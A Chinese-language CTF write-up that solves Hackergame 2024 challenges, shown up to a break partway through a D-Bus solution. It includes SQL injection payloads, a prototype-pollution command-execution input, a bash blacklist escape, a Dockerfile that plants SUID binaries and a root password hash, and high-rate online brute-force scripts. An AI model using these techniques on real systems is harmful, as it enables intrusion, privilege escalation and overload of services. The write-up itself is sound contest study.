# Hackergame 2024 个人题解
Lysithea 48th 5250 

![](https://img.shields.io/badge/你们怎么这么能卷啊-7899cc) ![](https://img.shields.io/badge/没有openAI_o1_preview用感觉像个原始人-ffdd88) ![](https://img.shields.io/badge/算力不足恐惧症-7899cc) ![](https://img.shields.io/badge/Z3也沙疯了-779977) ![](https://img.shields.io/badge/好几个就差一步大腿拍烂了-7899cc) ![](https://img.shields.io/badge/注意力涣散-779977) ![](https://img.shields.io/badge/xzrj3攻击服务器了ごめんね-ffdd88) ![](https://img.shields.io/badge/思维要活跃，要跳脱，不要硬刚-7899cc) ![](https://img.shields.io/badge/准备赛后不看题解把🥒🐱爆了-ffdd88)

## ![](https://img.shields.io/badge/web-0c4d72) 签到 

`http://202.38.93.141:12024/?pass=true`

## ![](https://img.shields.io/badge/web-0c4d72) 喜欢做签到的 CTFer 你们好呀

先找到他们招新的官网：https://www.nebuu.la/ （意外找了挺久，从比赛主页-承办单位进）

打开是个伪终端，功能实现还挺全的，虽然知道都是写好的JS，骗骗自己而已

`env`里有一个，然后`ls -al`可以看到个`.flag`，`cat .flag`是另一个。

还有个解法是去逆向JS，有几个很长的base64解一解就出来了。

## ![](https://img.shields.io/badge/general-af2447) 猫咪问答（Hackergame 十周年纪念版）

Hackergame的问答题目有一点好（或者不好），就是它提交答案是不限提交间隔的。偏偏它还出一大堆纯数字的题，这不是明摆着教人爆破嘛。

总之先拍个爆破脚本在这里：

```py
import requests
from bs4 import BeautifulSoup

sess = requests.session()
sess.cookies.set('session', os.environ.get('TOKEN',''), domain='202.38.93.141')

HOST = 'http://202.38.93.141:13030/'

ans = {
    'q1': '3A204',
    'q2': '2682',
    'q3': '程序员的自我修养',
    'q4': '336',
    'q5': '',
    'q6': '',
}

TARGET = 'q6'

resp = sess.post(HOST, data = ans)

bench_score = int(BeautifulSoup(resp.text, 'lxml').select_one('.alert').text.split('。')[0].split('为 ')[1])

for i in range(0, 6000):
    ans[TARGET] = str(i)
    resp = sess.post(HOST, data = ans)
    score = int(BeautifulSoup(resp.text, 'lxml').select_one('.alert').text.split('。')[0].split('为 ')[1])
    if score > bench_score:
        print('correct', i)
        break
    else:
        print('wrong', i)

```

#### Q1: 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？

首先去找历届Hackergame新闻，能找到他们[中科大Linux用户协会](https://lug.ustc.edu.cn/wiki/lug/events/hackergame/)的历年活动记录，不过很可惜Hackergame赛前讲座没有到第一届的。不过上面有个第三届的【链接已失效】，于是就去web of archive上找了一下，结果找到了2017年[失效之前的网页内容](https://web.archive.org/web/20170514082933/http://sec.ustc.edu.cn/doku.php/contest)。3A204

#### Q2: 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？

虽然我知道Github全找一遍就行，但是太累了，MD跟他爆了！

#### Q3: Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？
能让检索词成为第一的只能是猫咪问答了，所以去看了一下[当年和图书馆有关的题](https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md)

> 在中国科大图书馆中，有一本书叫做《程序员的自我修养:链接、装载与库》，请问它的索书号是？
>
> 打开中国科大图书馆主页，直接搜索“**程序员的自我修养**”即可。

#### Q4: 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

首先要找到是哪篇论文《[FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechanism in Email Systems](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)》。然后稍微读一下文章即可（或许也有种办法是搜一下数字）。目标在第6节的开头，`All 20 clients are configured as MUAs for all 16 providers
 via IMAP, resulting in 336 combinations (including 16 web
 interfaces of target providers). `

#### Q5: 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？
这个事是个大新闻，所以<s>跑得快</s>报道的媒体肯定很多，随便[搜了一个](https://www.phoronix.com/news/Russian-Linux-Maintainers-Drop)，里面就有commit的截图。

#### Q6: 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？

似乎是可以去Huggingface上找那个tokenizer.json，但是下载好像要申请权限。不过无所谓，既然是纯数字，那跟它爆了！


## ![](https://img.shields.io/badge/general-af2447) 打不开的盒

给了个stl模型文件，用blender导入之后，以网格模式查看，发现盒子中间有些节点很明显是flag的形状。于是只要把盒子外边的顶点在编辑模式下全删了就行。当然即使全删了，还需要人眼OCR。

## ![](https://img.shields.io/badge/general-af2447) 每日论文太多了！

下载论文之后，用Acrobat搜索flag，发现停在了一个神奇的图片后面（甚至看不见光标），用编辑模式把图片挪开就拿到flag了。

我更加震惊的是，期刊/会议发表论文居然可以这么藏私货的吗。

## ![](https://img.shields.io/badge/web-0c4d72) 比大小王

> 看得出来是想neta小猿口算

总之是一个比大小的题，要10秒内做100道。一开始服务端会把所有题目以json形式送过来，然后我们就可以在devtools控制台里跑个js脚本生成正确答案，就可以秒出了。另外这个题的题目发过来后比赛开始前有个倒计时，抢跑会被发现。

```js
state.inputs = state.values.map((el) => {
    let res = '<';
    if( el[0] > el[1] ){
        res = '>'
    }
    return res
})

submit(state.inputs)
// flag{I-AM-TH3-hACker-KiN9-0f-CoMP@RIN9-numbeRs-Z0Z4}
```

## ![](https://img.shields.io/badge/general-af2447) 旅行照片

我知道这个OSINT挺放水的了，但是我就是弱OSINT，怎么办嘛

#### Q1: 科里科气
<img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/klkq.jpg" width=50%/>

> 问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：X校区Y门，均为一个汉字）
> 问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：YYYYMMDD）

这个算是把标志性建筑摆脸上了，百度地图随便搜一下就出。这个地方在中校区和东校区之间，一共就几个门，遍历一下就出（而且门的名字只能有一个字，也排除了一些）

ACG音乐会的话，首先搜B站视频是不准的，因为基本不可能存在当天就放出演出视频的情况（总得剪辑的）。最好的方法是搜社团公号或者[微博]()，因为这种二次元活动一定是会有通知宣传的。

![](osint/acg_concert.jpg)

#### Q2: 两张景点照片

<img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image01.jpg" width=50%/><img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image04.jpg" width=50%/> 

> 问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）
> 问题 4: 这个景观所在的景点的名字是？（三个汉字）

右边是个标志性景点，google lens可以出，是宜昌**坛子岭**观

左边从垃圾桶的小字上隐隐约约能看到是六安，于是在六安市的公园，再加上有跑步道，树还挺多。多试了几次就能知道是**中央森林公园**。

#### Q3: 铁路俯视图

<img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image06.jpg" width=80%/>

> 糟了，三番五次调查学长被他发现了？不过，这个照片确实有趣，似乎有辆很标志性的……四编组动车？
>
> 问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX医院）
> 问题 6: 左下角的动车组型号是？

不会捏。四编组动车搜了一下新闻说是广州广清那里有引进，但是那么长的铁路也没找到和图片里特征相似的。

## ![](https://img.shields.io/badge/general-af2447) 不宽的宽字符

题目给的程序把输入路径从`wchar_t*`直接强转成`char*`了，不用说这是一种极其抽象的行为，因为宽字节数组包含单个0字节的时候不会被截断，但是`char*`会。所以即使程序在我们的输入后面添加了许多垃圾内容，只需要一个null byte就全部无效了。

可以用这个：
```py
s = b'Z:\\theflag\x00\xbb'

if len(s) % 2 == 1:
    s = s + b'\x00'

print(s.decode('utf-16'))
# 㩚瑜敨汦条묀
# flag{wider_char_isnt_so_great_bc8e1de5e2}
```

## ![](https://img.shields.io/badge/general-af2447) PowerfulShell

黑名单比较严格的一个bash逃逸。从结果来看能用的字符只有：`$+-123456789:=[]_``{|}~`。为了做出这个题，需要至少知道这么几件事：

- 一部分bash特殊变量：`$-=hB`包含当前终端的输出模式，`$_=input`是上一个引用的变量名
- 在没有后缀的情况下，`~`会展开为家目录。但我们可以用变量赋值`__=~`取消这个限制。这个很重要，因为我们只能通过这个方式拿到一个`s`
- `${-:1:1}`可以取子字符串。虽然0在黑名单里，但要取第一个字符可以`${-::1}`

这三点少一点应该就完全做不出来。属于是做出来脑子想穿，做不出来大腿拍烂。

```sh
__=~
${__:7:1}${-::1}
```

## ![](https://img.shields.io/badge/web-0c4d72) Node.js is Web Scale

直球考prototype pollution的。总之打开网页后上下分别填`__proto__.eee`和`cat /flag`添加后，直接访问`/execute?cmd=eee`就行

## ![](https://img.shields.io/badge/web-0c4d72)  PaoluGPT

给源码的SQLite注入，比较送。不过值得注意的是这个题没有藏表，所有flag全在文章内容里，所以得写代码遍历。虽然flag2是在隐藏文章里需要注入才能找到，但是flag1不需要注入的明显更难找，大隐隐于市了。

总之做个备忘，SQLite主表是`sqlite_master`，直接存的是表名和sql语句，所以不用爆列名了。

```sql
/view?conversation_id=1' union select name,sql from sqlite_master limit 1 offset 0--
' union select title,contents from messages limit 1 offset %s--
```

## ![](https://img.shields.io/badge/math-90b452) 强大的正则表达式

正则编程题，只能用数字小括号星号和数线，最大字符限制1000000。时间有限就只做了第一问。求16的模。因为`16*625=10000`，所以只要把后四位的情况遍历一下就行了。注意小于10000前面没有0，要单独处理

## ![](https://img.shields.io/badge/math-90b452) 惜字如金 3.0

> 沟槽的xzrj还在追我

第一问没什么好说，就是确保你理解了这套变换规则的。

第二问的CRC函数大小写信息被抹掉了。这个变化会影响结果，所以可以本地爆破出来。

首先说明一下，提交到网站上的文件如果包括错误的行，会返回你的行对应的hash（而不会暴露服务端的）。如果hash一致但内容错了，爆出的是你的文件里最后一个错误的字符。如果hash恰好和其他行一致（传错行了），那么也会指明。

```py
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'B', 48 # 这里少了48个B或b
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'B' 
    flip = sum(['b', 'B'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xdbeEaed4cF43, 0xFDFECeBdeeD9, 0xB7E85A4E5Dcd                 
    assert (u2, u1, u0) == (241818181881667, 279270832074457, 202208575380941)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
```

首先观察一下crc算法。第一步是用那个大小写未知的poly变量构造一个48位的整数`flip`，一一对应。之后用`flip`处理输入。从一个全1数开始，每次读入一个字节和最低字节异或，然后右移一位，根据最低位的情况是否和flip异或，重复8次，开始处理下一个字符。这个选择异或的过程是可逆的（假设flip最高位为1，可以通过最高位的情况预测是走哪个分支）。但对flag2没有帮助（对flag3可能有）。但是通过构造一个特定的输出可以让这个函数稳定返回`~flip`，即`FFFFFF` + 全0 + `80`。

然后就是第二个hash函数，是`2**48`模意义下做了个二次函数运算。因为模是合数所以这个乘法是不可逆的，不太确定非质数模意义下二次函数求根公式还有没有意义。总之我是taichi写了个gpu kernel爆算的。这竟然是我第一次写taichi。在和`range`不支持64位整数这件事斗争很久后，写出了这段东西：

```py
import taichi as ti

# export LD_LIBRARY_PATH="/usr/lib/wsl/lib:${LD_LIBRARY_PATH}"
ti.init(arch=ti.gpu, default_ip=ti.i64)

target_f = 'answer_c.py'
u2, u1, u0 = (241818181881667, 279270832074457, 202208575380941) if target_f == 'answer_b.py' else (246290604621823, 281474976710655, 281474976710655)
target_hash = 229418662089585

if target_f == 'answer_c.py':
    poly, poly_degree = 'CcccCCcCcccCCCCcCCccCCccccCccCcCCCcCCCCCCCccCCCCC', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'C' 
    flip = sum(['c', 'C'].index(poly[i + 1]) << i for i in range(poly_degree))

@ti.kernel
def calc_hash(hash: ti.u64) -> ti.u64:
    ''
    u1_ = ti.u64(u1)
    u2_ = ti.u64(u2)

    result = ti.u64(0)
    for i_high in range(0x1000, 0x1000000):
        for i_low in range(0x1000000):
            digest = ti.u64(i_high) * 0x1000000 + ti.u64(i_low)
            hash_res = (digest * (digest * u2_ + u1_)) & 0xffffffffffff
            if hash == hash_res:
                result = digest
                print(f"result: {digest}")
            
            if (i_low % ti.u64(0x100000) == 0) and (i_high % ti.u64(0x100000) == 0):
                print(f"status: {i_high // 0x100000} {i_low // 0x100000}")
            
    return result

flip_inv = calc_hash((target_hash - u0 + 2**48) % (2 ** 48))
print(f"result: {flip_inv}")
```

只要上线请求一组那个对应`~flip`的hash，然后拿到这里爆算就行了。在我的4060上把结果跑出来大概十几分钟。

flag3前半部分用相同办法可以爆出poly，但是hash里的u2,u1,u0里的大小写未知，并且这个是不影响运行结果的。因为拿不到任何服务端hash的信息，所以只能在线爆破了。hash的取值空间是`2**48`，但是这一行所有输入的取值空间是`2**32`。每次提交能检查的行数等于文件原行数97，所以我们最多爆`2**32 // 97 + 1 == 44278014`次。似乎刚好在爆破允许的边缘。

我用`httpx`写了个超快的异步并发算法。我在两个不同设备上跑两份这个代码可以发现请求速度明显变慢了，说明已经到达服务端的饱和吞吐量（或者至少是我们这个校园网带宽的最大吞吐量），不用做多线程优化了。目前这个算法是一轮触发100个请求，期间请求失败就立刻重新请求，所有请求全部成功后进入下一轮。我知道这个会导致一些轮空的机制，但我发现把这个100改大之后反而跑的更慢了，我觉得我这边快没用，带宽和服务端那边得能顶得住才行。那么这样大概是44万轮，按第一天的速度1秒一轮的话，大概总共用时5.09天……似乎有戏？（然后第二天服务器就降速了，用时翻了2-3倍，呃呃）

> 虽然我知道一般CTF比赛都是禁止在线爆破的。我还特意看了眼比赛规则，没提这个事

```py
template = "    u2, u1, u0 = 0xDFFFFFFFFFFF, 0xFFFFFFFFFFFF, 0xFFFFFFFFFFFF                 "
ind_0 = template.index("xDF") + 3
ind_1 = template.index("xF") + 2
ind_2 = template.rindex("xF") + 2
ind_mask = list(chain(range(ind_0, ind_0 + 10), range(ind_1, ind_1 + 11), range(ind_2, ind_2 + 11)))

def num_to_target_line(num):
    num_bin = f"{num & 0xffffffff:032b}".replace('0','F').replace('1','f')
    req_str = list(template)
    for i, bit in enumerate(num_bin):
        req_str[ind_mask[i]] = bit
    return ''.join(req_str)

client = httpx.AsyncClient()
client.cookies.set('session', TOKEN, domain = '202.38.93.141')

async def req_hash_async(num_iter):
    # construct body
    body = "\n".join([num_to_target_line(i) for i in num_iter]) + "\n"

    HOST = f'http://202.38.93.141:19975/{target_f}'
    while True:
        try:
            resp = await client.post(HOST, data=body)
            resp_json = resp.json()
            break
        except httpx.ConnectTimeout:
            continue
        except json.JSONDecodeError:
            if (resp.status_code == 502) or (not resp.text):
                continue

            print(f"json: {resp.text}")
            continue
        except (KeyboardInterrupt, SystemError):
            raise
        except Exception as e:
            if str(e) and str(e) != 'All connection attempts failed':
                print(f"unknown exception: {str(e).encode()}")
            continue
    
    if resp.status_code in (400, 200):
        for k,v in resp_json['wrong_hints'].items():
            if 'Unmatched hash' in v:
                continue
            else:
                print(f"possible result: {body.splitlines(keepends=False)[int(k) - 1], v}")

    else:
        # unlikely
        print(f"unlikely: {num_iter, resp.text, body}")

N_LINE = 97
EVENT_BATCH_SZ = 100
import sys
START_BATCH = int(sys.argv[1]) if len(sys.argv)>1 else 0
INTMAX_RES = 2 ** 32 // 97

def task_iter(loop, max_task = 1000, start_task = 0):
    for i in range(start_task, max_task):
        yield loop.create_task(req_hash_async(range(i*N_LINE, (i+1)*N_LINE)))

loop = asyncio.get_event_loop()
for start_task in tqdm(range(START_BATCH, INTMAX_RES + EVENT_BATCH_SZ, EVENT_BATCH_SZ)):
    t_st = time.time()
    loop.run_until_complete(asyncio.wait(list(task_iter(loop, start_task + EVENT_BATCH_SZ, start_task))))
    t_ed = time.time()
    # print(f"Batch {start_task}: duration: {t_ed - t_st} s")

loop.close()
```

另外我意识到我们可以找到一组输入让它的hash返回`answer_c.txt`，但是没想到怎么用，因为长度检查加上爆hash的难度，基本不可能用这种方法leak flag。也许是我想错了吧。期待出题人或者其他人给出不基于在线爆破/降低在线爆破压力的解法（比如说本地逆那个crc发现相当一部分请求给出的hash是相同的）。不然的话怎么说呢，校内骑在服务器上网速更快，专业团队有更多云设备的话也能多端高并发，就我这什么也没有，那不是很不爽。

## ![](https://img.shields.io/badge/math-90b452) 优雅的不等式

只用加减乘除乘方构造一个sympy函数，使得其在0-1定积分等于`pi - p/q`，其中p/q是给定的两个数。flag2需要给出`q`达到`2**200`的最近逼近。

只做了第一问，只要解决1/2和8/3两个最简单情况：
```py
naive_f_0 = f'4*((1-x**2)**(x/(x+x))-1+x)'
naive_f_1 = f'4*((1-x**2)**(x/(x+x))-1+x**2)'
```

## ![](https://img.shields.io/badge/general-af2447) 无法获得的秘密

题目是个不能复制的NoVNC连接一个不联网的debian桌面系统，有一个`/secret`大约64MB的二进制文件，我们需要把这个文件的内容分毫不差地带出来。

传说中的OCR题。作为开始的第一步，我想这个题应该需要大量机器辅助操作，所以我写了一个`selenium`和网页交互。考虑到写鼠标操作有点困难，我只写了向终端输入内容的部分，进入系统后我需要手动打开终端最大化。

```py
input("> ready to paste shell")

driver.switch_to.frame('novnc-iframe')

driver.execute_script('document.getElementById("noVNC_control_bar_handle").remove()')

driver.find_element(By.CSS_SELECTOR, 'canvas').send_keys(init_cmd + '\n')
```

然后我们需要把二进制的secret转化为可打印字符。我一开始用的是base64，但后来我意识到这会给OCR工作带来多么大的压力后，我采用了base16，也就是hex编码。这样文件大小会变为2倍，但是可识别性容易多了。

```py
init_cmd = 'echo "print(open(\'/secret\',\'rb\').read().hex(sep=\'\\n\',bytes_per_sep=38).upper())">p.py && python3 p.py >s && echo \'#!/bin/bash\'>c && echo \'head -n$1 s|tail -n30\'>>c && chmod +x c && head -n100 s'
```
这段代码生成几个脚本文件
- `p.py`: 把secret转换为base16存储到本地文件`s`中。每行最多38个字符（和base64默认一致）
- `c`: shell脚本，用head和tail，打印文件固定位置下30行。

之后利用`selenium`的截图功能，每运行一次`c`就截一张图，大概总共需要460张图把整个文件截完。

```py
for i in range(460):
    driver.find_element(By.CSS_SELECTOR, 'canvas').send_keys(f"bash c {(i + 1)*N_LINE}\n")
    time.sleep(2)
    driver.save_screenshot(f'tmp/{i:04d}.png')
    print(f"screenshot {i} saved")
```

在正式OCR之前还要做些预处理，截取文字区域，二值化。这部分我用的opencv2。

```py
def preprocess(img_path, slice_row = True):
    im = cv2.imread(img_path)
    im = cv2.cvtColor(im, cv2.COLOR_RGB2GRAY)

    im = im[164:829, 100:900]
    # print(im.shape, im.dtype)

    thre, im_thre = cv2.threshold(im, 127, 255, cv2.THRESH_BINARY_INV)
    if slice_row:
        # print(im_thre.shape, im_thre.dtype)
        row_hist = np.mean(im_thre, axis=1)
        # col_hist = np.mean(im_thre, axis=0)
        # print(row_hist)

        row_slices = []
        # record max hist of this row
        row_hist_max = []

        record_st = None

        for i_row in range(row_hist.shape[0]):
            is_gap = row_hist[i_row] < .1
            if (record_st is not None) and is_gap:
                # stop recording
                row_slices += [im_thre[record_st:i_row, :]]
                row_slices[-1] = cv2.resize(row_slices[-1], (row_slices[-1].shape[1] * 3, row_slices[-1].shape[0] * 3), cv2.INTER_LINEAR)
                row_hist_max += [np.mean(row_slices[-1][:])]
                record_st = None

            elif (record_st is None) and (not is_gap):
                # start recording
                record_st = i_row

        # there should be one line that is very small, which is the shell prompt
        I_prompt = np.argmin(np.array(row_hist_max))

        # print(col_hist)

        # to grey
        return row_slices[I_prompt:]
    
    else:
        return im_thre
```

之后进入OCR环节，试了easyocr，umi ocr和tesseract。我这才意识到在追求绝对精度的前提下，现有OCR技术其实还挺糟糕的。另外我在喂给OCR之前还尝试行切割，但还是效果很差。

最后我拿出来手头最nb的OCR软件：Adobe Acrobat。不得不说商业软件就是猛啊，连行切割都不用，直接出结果。

OCR结果出来后，用了`pdfminer`把文字从PDF提取出来。然后会发现文本里其实有不少错误，有些是转换为了base16以外的字符，比如S和5，l和1这种。但还有一些是Base16内部混淆，最经典的就是`B,5,8`这三个字符。其实为了识别精度应该把这三个字符替换成其他不会混淆的字符，但我实在懒得再跑一边OCR流程，于是写了个验证脚本。大概逻辑是，把本地文件的30行传上去，用`diff`做逐行匹配，找出每一页上第几行第几个字母和远程结果不同。最后得到的一个纠正json，格式大概长这样：

```py
err_map_detail = {
    (2100, 7): ('747BD11', '7478D11',),
    (2100, 11): ('68D3BD', '68D38D'),
    (2700, 5): ('086DB9', '086D89'),
    (3690, 3): ('4BD713', '48D713'),
    (4590, 17): ('3E8BBF', '3E5BBF'),
    (6270, 14): ('ECA85B', 'ECA55B'),
    (6270, 29): ('7FB8C1', '7FB5C1'),
    (7440, 23): ('83BD74', '838D74'),
    (8730, 20): ('E8E14C', 'E5E14C'),
    (8910, 6): ('DB2D7E', 'D82D7E'),
    (9780, 21): ('7DB3F', '7D83F'),
    (12090, 30): ('758C1F', '755C1F'),
    (12120, 14): ('FAF8CF', 'FAF5CF'),
    (12360, 14): ('257BD', '2578D'),
    (13410, 4): ('A78CD', 'A75CD'),

}
```

全部处理完后，最后算一个整个文件的md5，结束战斗。

> 忽然意识到最开始文本化的时候，如果能引入纠错码机制，可能省不少事。
>
> 看完题解：原来题解用的是图片编码整个文件，可以一张图直出。可以用带纠错机制的图片编码，或者把VNC的websocket暴露出来自己连接然后改设置为无损传输。

## ![](https://img.shields.io/badge/general-af2447) Docker for Everyone Plus

前年docker题升级版。现在docker只能用sudo调用了，并且限制了只能特定格式的命令，但是docker镜像可以自己打包上传。flag在一个设备文件里，只有`root`和`disk`组有读写权限。

首先这个题终端可以用`lrzsz`收文件。我用pwntools写了个上传函数，带进度条（不太准是因为字符escape的原因，上传文件大小会比真实文件大小大个百分之几）

```py
def sz_upload(conn, fpath):
    '''
    '''
    conn.sendline(b'rz')
    conn.recvuntil(b'waiting to receive.**')
    
    conn_zm = process(['sz',fpath])
    with tqdm(total = os.stat(fpath).st_size) as pbar:
        while True:
            try:
                resp = conn.recv(1024 * 16, timeout=.1)
                conn_zm.send(resp)

                resp = conn_zm.recv(1024 * 16, timeout=.01)
                conn.send(resp)
                pbar.update(len(resp))
            except EOFError:
                break
    return
```

第一问允许的命令格式`sudo -l`为：
```
User user may run the following commands on dockerv:
    (root) NOPASSWD: /usr/bin/docker run --rm -u 1000\:1000 *, /usr/bin/docker
        image load, !/usr/bin/docker * -u0*, !/usr/bin/docker * -u?0*,
        !/usr/bin/docker * --user?0*, !/usr/bin/docker * -ur*, !/usr/bin/docker
        * -u?r*, !/usr/bin/docker * --user?r*
```

所以用前缀限制了我们只能以UID/GID=1000进入容器。我试了直接在后面加`-u  0`，无效，似乎是前面申请了低权限后面再次申请高权限就会被阻止。

以这种方式进入容器的话，suid的cat似乎用不了，但是直接su可以，记得把容器内的su给上suid权限。

总之参考了[这篇博客](https://www.cnblogs.com/kqdssheng/p/18275541#id2.5)。我容器内的密码哈希的用户名用的和前面不一样，这样似乎就不会检查容器外的密码，但获得的UID也确实是0。

```dockerfile
FROM alpine

RUN chmod 4755 /bin/sh /bin/cat /bin/su /usr/bin/passwd

RUN echo me:x:1000:1000:me:/home/me:/bin/sh >>/etc/passwd
RUN echo you:x:1001:1001:you:/home/you:/bin/sh >>/etc/passwd
# root password is password123
# generate with `openssl passwd -1 -salt r00t password123`
RUN sed -i 's/root::0:0:root:/root:$1$r00t$HZoYdo0F7UZbuKrEXMcah0:0:0:root:/g' /etc/passwd
RUN sed -i 's/root:x:0:0:root:/root:$1$r00t$HZoYdo0F7UZbuKrEXMcah0:0:0:root:/g' /etc/passwd

CMD [ "/bin/sh" ]
```

第二问加了`--no-new-priviledge`设置，suid相关提权都会失效，暂时不知道怎么绕。常见的bind docker.sock之类的方法也试过了，没用

```
User user may run the following commands on dockerv:
    (root) NOPASSWD: /usr/bin/docker run --rm --security-opt\=no-new-privileges
        -u 1000\:1000 *, /usr/bin/docker image load, !/usr/bin/docker * -u0*,
        !/usr/bin/docker * -u?0*, !/usr/bin/docker * --user?0*,
        !/usr/bin/docker * -ur*, !/usr/bin/docker * -u?r*, !/usr/bin/docker *
        --user?r*, !/usr/bin/docker * --privileged*, !/usr/bin/docker *
        --device*
```

> 赛后：第二问预期解是在容器内`mknod`一个对应设备号、被1000拥有的设备文件，然后在容器外用`/proc/[pid]/root`访问容器内命名空间根目录（不能在容器内cat，有cgroup）。但是有个神秘的非预期是`--security-opt=no-new-privileges:false`，我真的感觉我做的时候试了这种方式，但可能因为flag1我没有完全搞清楚，所以这里以为我试过了其实因为别的原因没有成功。有点可惜

## ![](https://img.shields.io/badge/general-af2447) 不太分布式的软总线
最后一天看这题三问怎么那么多人做了，干脆也做一下。分类上这题严格应该属于PPC。

DBus是一种进程间通信（IPC）机制，感觉和RPC类的有点像，可以做远程过程调用，或者单纯收发信号。通过dbus-daemon来整合事件循环。许多Linux桌面系统，比如gtk，内部的进程间通信就是用的dbus。gtk的dbus似乎有个专门的库叫gio，抽象程度比dbus稍高，更好用一点。

dbus一般会分系统总线和会话总线，系统总线只有一个，这个题的flagserver就是挂在系统总线上的。会话总线可以有很多，每个会话总线会对应一个DISPLAY环境变量，这也就是为什么用X11或者Xwayland的时候要指定这个环境变量，这样才能与对应的桌面组件进行通信。当然这个题不用想那么多，我们就单纯把这个作为一种RPC手段就行了。

> 为什么提这个，因为网上搜dbus搜到的几乎全是会话总线的代码

和总线通信需要总线地址，对象名，接口名和方法名（如果是方法调用）。这些在文件里内容比较分散。但是这个题附件的`getflag3.c`其实就是一个这种dbus请求的完美模板，只要稍加改动就能直接过flag1，非常感人。不知道这是不是这个题通过率如此高的原因。

```c
#include <gio/gio.h>
#include <glib.h>
void flag1(GDBusProxy *proxy)
{
	GVariant *result;
	GError *error = NULL;
	const gchar *str;

	g_printf("flag1...\n");
	result = g_dbus_proxy_call_sync(proxy,
					"GetFlag1",
					g_variant_new ("(s)", "Please give me flag1"),
					G_DBUS_CALL_FLAGS_NONE,
					-1,
					NULL,
					&error);
	g_assert_no_error(error);
	g_variant_get(result, "(&s)", &str);
	g_printf("The server answered: '%s'\n", str);
	g_variant_unref(result);
    // flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_41140ef451}
}

int main( int argc , char ** argv, char **environ)
{
    GDBusConnection * connection;
	GError *error = NULL;
	const char *version;
	GVariant *variant;
    
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if(connection == NULL) {
        return -1;
    }

    proxy = g_dbus_proxy_new_sync(connection,
				      G_DBUS_PROXY_FLAGS_NONE,
				      NULL,				/* GDBusInterfaceInfo */
				      BUS_NAME,		/* name */
				      OBJ_PATH,	/* object path */
				      INTERFACE,	/* interface */
				      NULL,				/* GCancellable */
				      &error);

    flag1(proxy);
    return 0;
}
```

另外也可以用`dbus-send`shell指令，原则上一行就行。但是这个好像很难处理后两问。

```bash
#!/bin/bash
BUS_NAME="cn.edu.ustc.lug.hack.FlagService"
OBJ_PATH="/cn/edu/ustc/lug/hack/FlagService"
INTERFACE="cn.edu.ustc.lug.hack.FlagService"

dbus-send --system  --print-reply=literal --dest=$BUS_NAME $OBJ_PATH $INTERFACE.GetFlag1 string:"Please give me flag1"
```

flag2需要通过dbus传一个文件描述符过去，但不能是个文件。我们可以本地开一个socket server，再开一个socket连接那个socket server，最后直接把socket的fd传过去，可以用`g_dbus_proxy_call_with_unix_fd_list_sync`这个函数。

> 感觉我socket编程写的挺烂的

```c
#include <unistd.h>
#include <gio/gio.h>
#include <gio-unix-2.0/gio/gunixfdlist.h>
#include <gio-unix-2.0/gio/gfiledescriptorbased.h>
#include <glib.h>

int socket_server() {
	int fd;
	struct sockaddr_in addr;
	int ret;
	char buff[8192];
	struct sockaddr_in from;
	int ok = 1;
	int len;
	socklen_t fromlen = sizeof(from);

	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		ok = 0;
	}

	if (ok) {
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_port = htons(8000);
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
		if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
			perror("bind");
			ok = 0;
		}
	}

	puts("bind localhost:8000");

	if(ok && (listen(fd, QUEUE) == -1)) {
		perror("listen");
		ok = 0;
	}

	int reply_sock_fd = accept(fd, (struct sockaddr*)&from, &fromlen);
	puts("connection accepted");
	
	const char *msg = "Please give me flag2\n\x00";
	send(reply_sock_fd, msg, strlen(msg), 0);

	// puts(buff);

	if (fd >= 0) {
		close(fd);
	}

	return 0;
}

void flag2(GDBusProxy *proxy) {
    GVariant *result;
